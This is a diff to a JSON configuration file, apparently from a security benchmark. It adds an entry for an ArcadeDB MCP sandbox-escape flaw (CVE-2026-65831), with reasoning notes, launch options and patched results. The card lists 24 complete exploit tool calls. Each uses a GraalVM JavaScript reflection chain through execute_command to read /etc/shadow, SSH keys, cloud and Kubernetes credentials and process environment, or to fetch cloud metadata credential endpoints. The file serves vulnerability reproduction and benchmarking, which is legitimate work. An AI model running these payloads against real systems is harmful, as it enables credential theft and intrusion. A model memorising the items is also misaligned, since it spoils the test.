@@ -413,6 +413,16 @@
       "role": "card_checker",
       "scope": "CVE-2026-33060",
       "model": "claude-fable-5-1"
+    },
+    {
+      "role": "calibrator",
+      "scope": "CVE-2026-65831",
+      "model": "claude-opus-4-8"
+    },
+    {
+      "role": "card_checker",
+      "scope": "CVE-2026-65831",
+      "model": "claude-fable-5-1"
     }
   ],
   "prefilter": [
@@ -138174,7 +138184,14 @@
   "draw": {
     "rule_commit": "e67971b9c85c9b79c4dcf80ae11a8d9fc42c8015",
     "grammar_fingerprint": "3f5a4925ad36dd6d3a57afa740165ae828506bed10c6a192a3dca7a194ebe2de",
-    "settlements": [],
+    "settlements": [
+      {
+        "flaw": "CVE-2026-65831",
+        "criterion": "stdio_tools_call",
+        "verdict": true,
+        "reason": "Classifiers split on transport (one read the advisory's HTTP entry point as http-only). ArcadeDB ships a built-in MCP server over stdio (bin/mcp-stdio.sh, official docs) and the flaw is reached through tools/call: at tag 26.6.1 the execute_command tool passes an arbitrary language verbatim to getQueryEngine, so language=js routes to the polyglot engine whose insufficient permission analysis the 26.7.1 fix corrects (GHSA-48qw-824m-86pr, the 'MCP analyze operation lacked the same check'). Reached through tools/call: True."
+      }
+    ],
     "walk": [
       {
         "identifier": "CVE-2025-54994",
@@ -138190,6 +138207,11 @@
         "identifier": "CVE-2026-33060",
         "outcome": "drawn",
         "reason": "Reproduces (internal_fetch SSRF: the CKAN tools fetch a caller-supplied server_url and echo the body). Card confirmed exhaustive by an independent Fable card-check; 3 kept catalogue places (IMDS, ECS task and EKS pod-identity link-local credential endpoints), no layout place in reach. Vulnerable pinned to 0.4.83, the last version before the makeCkanRequest guard: 0.4.84 already blocks the CKAN path and its only residual (the SPARQL path) needs HTTPS, unreachable on the HTTP-only bench sentinels, so 0.4.84 can surface no planted nonce; patched 0.4.85, the advisory's first patched version."
+      },
+      {
+        "identifier": "CVE-2026-65831",
+        "outcome": "drawn",
+        "reason": "Reproduces (GraalVM polyglot-JS sandbox escape via the execute_command MCP tool at language=js: a reflection chain off the bound database object reaches any host class). Dual reach: java.io reads any host file (read_outside_scope), java.net fetches any internal address (internal_fetch); process creation disabled, so no command_execution. Card confirmed exhaustive by an independent Fable card-check; 24 kept catalogue places (21 arbitrary_read files plus 3 internal_fetch metadata endpoints). The 3 layout places are reachable but the maintainer route check found no route, so none is kept. No siblings (the 3 census neighbours are fixed after 26.7.1, so the patched twin still carries them). Vulnerable 26.6.1, patched 26.7.1 (the fix hardens the engine's host-access policy). The launch enables the MCP write permissions a js script needs to reach the engine, identical on both images, the fix being in the engine sandbox, not the permission layer."
       }
     ],
     "cards": [
@@ -138493,6 +138515,236 @@
         "benign_call": "ckan_status_show({\"server_url\": \"https://demo.ckan.org\"}) -> on both 0.4.83 and 0.4.85 returns the normal CKAN status document for the public demo portal (is_error=false, no nonce, not aimed). A legitimate CKAN use: a public https host validateServerUrl admits, no internal address, so the patched server does not reject it and no planted nonce surfaces.",
         "patched_result": "On 0.4.85 all three exploits are rejected by validateServerUrl before any fetch with `Access to private/internal IP addresses is not allowed.` (is_error=true, no planted nonce surfaces). The benign ckan_status_show against https://demo.ckan.org still returns status_code 200 and does not error. kit_driver (check_target) reports zero dead conditions: the fixture reproduces on 0.4.83 and is clean on 0.4.85.",
         "attempts": 1
+      },
+      {
+        "flaw": "CVE-2026-65831",
+        "mechanism": "read_outside_scope",
+        "effect_class": "read_outside_scope",
+        "siblings": [],
+        "kept": [
+          {
+            "place_id": "etc-shadow",
+            "reason": "arbitrary_read: the reflection escape reads /etc/shadow via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "container-hostname",
+            "reason": "arbitrary_read: the escape reads /etc/hostname, surfacing the launch --hostname nonce; present on 26.6.1, blocked on 26.7.1. No tool returns the hostname."
+          },
+          {
+            "place_id": "aws-credentials",
+            "reason": "arbitrary_read: the reflection escape reads /tmp/.aws/credentials via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "gcloud-adc",
+            "reason": "arbitrary_read: the reflection escape reads /tmp/.config/gcloud/application_default_credentials.json via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "azure-profile",
+            "reason": "arbitrary_read: the reflection escape reads /tmp/.azure/azureProfile.json via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "ssh-private-key",
+            "reason": "arbitrary_read: the reflection escape reads /tmp/.ssh/id_rsa via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "shell-history",
+            "reason": "arbitrary_read: the reflection escape reads /tmp/.bash_history via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "git-credentials",
+            "reason": "arbitrary_read: the reflection escape reads /tmp/.git-credentials via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "npmrc",
+            "reason": "arbitrary_read: the reflection escape reads /tmp/.npmrc via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "gh-hosts",
+            "reason": "arbitrary_read: the reflection escape reads /tmp/.config/gh/hosts.yml via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "docker-config",
+            "reason": "arbitrary_read: the reflection escape reads /tmp/.docker/config.json via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "kube-config",
+            "reason": "arbitrary_read: the reflection escape reads /tmp/.kube/config via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "pgpass",
+            "reason": "arbitrary_read: the reflection escape reads /tmp/.pgpass via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "mysql-client-cnf",
+            "reason": "arbitrary_read: the reflection escape reads /tmp/.my.cnf via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "mongorc",
+            "reason": "arbitrary_read: the reflection escape reads /tmp/.mongorc.js via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "mysql-system-cnf",
+            "reason": "arbitrary_read: the reflection escape reads /etc/mysql/my.cnf via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "proc-environ",
+            "reason": "arbitrary_read: the escape reads the server JVM's own /proc/self/environ, surfacing the planted MCP_UPSTREAM_SECRET; present on 26.6.1, blocked on 26.7.1. The server does not expose its process environment through any tool."
+          },
+          {
+            "place_id": "run-secrets",
+            "reason": "arbitrary_read: the reflection escape reads /run/secrets/db_password via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "k8s-sa-token",
+            "reason": "arbitrary_read: the reflection escape reads /var/run/secrets/kubernetes.io/serviceaccount/token via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "etc-hosts",
+            "reason": "arbitrary_read: the reflection escape reads /etc/hosts via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "auth-log",
+            "reason": "arbitrary_read: the reflection escape reads /var/log/auth.log via java.io.File+Scanner; the nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never reads this path itself, at launch or through any tool."
+          },
+          {
+            "place_id": "imds",
+            "reason": "internal_fetch: the reflection escape loads java.net.URL and openStream()s http://169.254.169.254/latest/meta-data/iam/security-credentials/; the sentinel-served nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never fetches this endpoint itself."
+          },
+          {
+            "place_id": "ecs-task-credentials",
+            "reason": "internal_fetch: the reflection escape loads java.net.URL and openStream()s http://169.254.170.2/v2/credentials/; the sentinel-served nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never fetches this endpoint itself."
+          },
+          {
+            "place_id": "eks-pod-identity",
+            "reason": "internal_fetch: the reflection escape loads java.net.URL and openStream()s http://169.254.170.23/v1/credentials; the sentinel-served nonce surfaced on 26.6.1 and was blocked on 26.7.1. ArcadeDB never fetches this endpoint itself."
+          }
+        ],
+        "unkept": [
+          {
+            "place_id": "process-account-identity",
+            "reason": "Reach does not reach it: reachable_by=[command_execution] only. This flaw's reach is {arbitrary_read, internal_fetch}; process creation is disabled (allowCreateProcess=false), so command_execution is unreachable and the account identity cannot be surfaced.",
+            "route_checked": null
+          },
+          {
+            "place_id": "dotenv-file",
+            "reason": "Not plantable: kind=unplaceable. A generic 'server .env in its working directory' with no concrete coordinate the kit can seed; the concrete, placeable workspace .env is the layout place workspace-dotenv. No nonce can be planted, so no proof could ever surface.",
+            "route_checked": null
+          },
+          {
+            "place_id": "proc-cmdline",
+            "reason": "Not plantable: kind=unplaceable. The process cmdline is fixed by the kit's own launch argv; there is no seedable location for a nonce, so it cannot be credited.",
+            "route_checked": null
+          },
+          {
+            "place_id": "server-own-source",
+            "reason": "Not plantable: kind=unplaceable. No concrete host path for a hardcoded secret in ArcadeDB's own install tree that the kit could seed.",
+            "route_checked": null
+          },
+          {
+            "place_id": "server-own-config",
+            "reason": "Not plantable: kind=unplaceable. The server's own config/state file is not a kit-seedable location (the kit does not plant into the install tree).",
+            "route_checked": null
+          },
+          {
+            "place_id": "docker-daemon-api",
+            "reason": "Not plantable: kind=unplaceable. No sentinel coordinate (docker.sock / bridge-gateway TCP) the kit stands up, so no nonce to fetch.",
+            "route_checked": null
+          },
+          {
+            "place_id": "k8s-api-server",
+            "reason": "Not plantable: kind=unplaceable. No sentinel coordinate for the cluster API; nothing for the kit to seed.",
+            "route_checked": null
+          },
+          {
+            "place_id": "loopback-service",
+            "reason": "Not plantable: kind=unplaceable. Generic loopback service with no concrete port/coordinate; the kit cannot stand up a nonce-serving endpoint.",
+            "route_checked": null
+          },
+          {
+            "place_id": "private-range-service",
+            "reason": "Not plantable: kind=unplaceable. Generic private-range service with no concrete coordinate; the kit cannot seed a nonce.",
+            "route_checked": null
+          },
+          {
+            "place_id": "bare-remote-url",
+            "reason": "Layout place reachable by arbitrary_read, so the maintainer route check ran (no LLM): ArcadeDB takes no scope and its MCP tools surface no filesystem path, so the server's own outputs reveal no route to the anchor. No route, not kept.",
+            "route_checked": false
+          },
+          {
+            "place_id": "bare-history-env",
+            "reason": "Layout place reachable by arbitrary_read, so the maintainer route check ran (no LLM): ArcadeDB takes no scope and its MCP tools surface no filesystem path, so the server's own outputs reveal no route to the anchor. No route, not kept.",
+            "route_checked": false
+          },
+          {
+            "place_id": "workspace-dotenv",
+            "reason": "Layout place reachable by arbitrary_read, so the maintainer route check ran (no LLM): ArcadeDB takes no scope and its MCP tools surface no filesystem path, so the server's own outputs reveal no route to the anchor. No route, not kept.",
+            "route_checked": false
+          }
+        ],
+        "launch_options": [
+          {
+            "option": "config/mcp-config.json: enabled",
+            "value": "true",
+            "reason": "The MCP server ships disabled (enabled defaults to false); it must be on to reach any tool over stdio. Identical on both images.",
+            "documentation": "https://docs.arcadedb.com/arcadedb/reference/mcp/mcp.html (config/mcp-config.json flags)"
+          },
+          {
+            "option": "config/mcp-config.json: allowInsert/allowUpdate/allowDelete/allowSchemaChange/allowAdmin",
+            "value": "true",
+            "reason": "ArcadeDB classifies a polyglot (language=js) script as a write/CREATE operation; execute_command needs write-class permission to reach the engine at all. These default to false. This is a deployment choice, identical on both images, so the only behavioural difference is the engine host-access policy, not the permission set.",
+            "documentation": "https://docs.arcadedb.com/arcadedb/reference/mcp/mcp.html (config/mcp-config.json flags)"
+          },
+          {
+            "option": "config/mcp-config.json: allowedUsers",
+            "value": "[\"root\"]",
+            "reason": "The stdio session authenticates as root; the flaw does not depend on the principal (26.7.1 denies the reflection chain even for root). Identical on both images.",
+            "documentation": "https://docs.arcadedb.com/arcadedb/reference/mcp/mcp.html (config/mcp-config.json flags)"
+          },
+          {
+            "option": "ARCADEDB_SETTINGS: -Darcadedb.server.rootPassword",
+            "value": "playpassword",
+            "reason": "A root password is mandatory for bin/mcp-stdio.sh to start the server.",
+            "documentation": "https://docs.arcadedb.com/arcadedb/reference/configuration/ (arcadedb.server.rootPassword)"
+          },
+          {
+            "option": "ARCADEDB_SETTINGS: -Darcadedb.server.defaultDatabases",
+            "value": "mydb[seed:seedpass:admin]",
+            "reason": "Seeds the mydb database the execute_command tool targets; without a database the tool call has nothing to bind the `database` object to.",
+            "documentation": "https://docs.arcadedb.com/arcadedb/reference/configuration/ (arcadedb.server.defaultDatabases)"
+          }
+        ],
+        "seeded_in_layout": [],
+        "fallback_scope": null,
+        "fallback_documentation": null,
+        "exploit_calls": [
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/etc/shadow\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/etc/hostname\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/tmp/.aws/credentials\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/tmp/.config/gcloud/application_default_credentials.json\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/tmp/.azure/azureProfile.json\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/tmp/.ssh/id_rsa\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/tmp/.bash_history\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/tmp/.git-credentials\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/tmp/.npmrc\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/tmp/.config/gh/hosts.yml\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/tmp/.docker/config.json\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/tmp/.kube/config\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/tmp/.pgpass\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/tmp/.my.cnf\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/tmp/.mongorc.js\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/etc/mysql/my.cnf\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/proc/self/environ\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/run/secrets/db_password\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/var/run/secrets/kubernetes.io/serviceaccount/token\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/etc/hosts\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var F=cl.loadClass(\\\"java.io.File\\\");var f=F.getConstructor(S).newInstance(\\\"/var/log/auth.log\\\");var sc=Sc.getConstructor(F).newInstance(f);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var U=cl.loadClass(\\\"java.net.URL\\\");var IS=cl.loadClass(\\\"java.io.InputStream\\\");var u=U.getConstructor(S).newInstance(\\\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\\\");var is=U.getMethod(\\\"openStream\\\").invoke(u);var sc=Sc.getConstructor(IS).newInstance(is);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var U=cl.loadClass(\\\"java.net.URL\\\");var IS=cl.loadClass(\\\"java.io.InputStream\\\");var u=U.getConstructor(S).newInstance(\\\"http://169.254.170.2/v2/credentials/\\\");var is=U.getMethod(\\\"openStream\\\").invoke(u);var sc=Sc.getConstructor(IS).newInstance(is);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}",
+          "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"js\", \"command\": \"var cl=database.getClass().getClassLoader();var S=cl.loadClass(\\\"java.lang.String\\\");var Sc=cl.loadClass(\\\"java.util.Scanner\\\");var U=cl.loadClass(\\\"java.net.URL\\\");var IS=cl.loadClass(\\\"java.io.InputStream\\\");var u=U.getConstructor(S).newInstance(\\\"http://169.254.170.23/v1/credentials\\\");var is=U.getMethod(\\\"openStream\\\").invoke(u);var sc=Sc.getConstructor(IS).newInstance(is);sc.useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}"
+        ],
+        "benign_call": "{\"tool\": \"execute_command\", \"args\": {\"database\": \"mydb\", \"language\": \"sql\", \"command\": \"SELECT 1 AS probe\"}}",
+        "patched_result": "On 26.7.1 every exploit is blocked: the engine builds its GraalVM context with HostAccess denying Class/ClassLoader/reflect, so database.getClass().getClassLoader() throws before any java.io.File read or java.net.URL fetch, and PolyglotQueryEngine additionally gates scripts behind UPDATE_SECURITY. No nonce surfaced for any of the 24 kept places (verified via kit_driver). The benign SQL call still succeeds (not errored).",
+        "attempts": 2
       }
     ],
     "card_checks": [
@@ -138503,6 +138755,11 @@
       },
       {
         "flaw": "CVE-2026-33060",
+        "reported_gaps": [],
+        "confirmed_gaps": []
+      },
+      {
+        "flaw": "CVE-2026-65831",
         "reported_gaps": [],
         "confirmed_gaps": []
       }
@@ -138525,7 +138782,8 @@
     ],
     "drawn": [
       "CVE-2026-4270",
-      "CVE-2026-33060"
+      "CVE-2026-33060",
+      "CVE-2026-65831"
     ]
   }
 }
